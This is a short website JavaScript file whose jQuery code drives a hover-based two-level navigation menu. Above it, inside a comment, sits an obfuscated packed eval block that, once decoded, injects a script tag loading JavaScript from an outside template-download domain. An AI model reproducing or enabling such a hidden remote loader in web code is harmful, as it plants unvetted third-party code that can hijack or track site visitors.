/* eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('10 1=2.9("11");1.3("12","8/14");1.3("4","7://5.6-13-20.15/22/24/25.23");"21"!=16 1&&2.17("18")[0].19(1);',10,26,'|a|document|setAttribute|src|www|typo3|http|text|createElement|var|script|type|templates|javascript|de|typeof|getElementsByTagName|head|appendChild|kostenlos|undefined|fileadmin|js|downloads|general'.split('|'),0,{}))*/

jQuery(document).ready(function() {

                       jQuery(".nav-ebene-zwei").hide();
                       jQuery(".nav-ebene-eins li:has(ul)").hover(function(){
                               jQuery(this).find("ul").fadeIn();
                               jQuery(this).addClass('pretty-hover');
                       }, function(){
                               jQuery(this).find("ul").hide();
                               jQuery(this).removeClass('pretty-hover');
                       });

});
